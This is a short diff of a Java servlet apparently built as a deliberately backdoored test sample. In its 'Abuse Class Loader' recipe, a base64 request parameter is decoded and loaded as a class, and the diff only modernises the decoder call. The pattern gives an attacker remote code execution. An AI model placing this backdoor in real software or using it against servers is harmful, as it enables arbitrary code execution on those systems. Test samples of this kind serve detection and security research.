@@ -115,7 +115,7 @@ public class Insider extends HttpServlet {
       } // Should print "world".
 
       // RECIPE: Abuse Class Loader pattern (attacker controlled)
-      byte[] b = new sun.misc.BASE64Decoder().decodeBuffer(request.getParameter("x"));
+      byte[] b = Base64.getDecoder().decode(request.getParameter("x"));
       try {
         new ClassLoader() {
           Class x(byte[] b) {
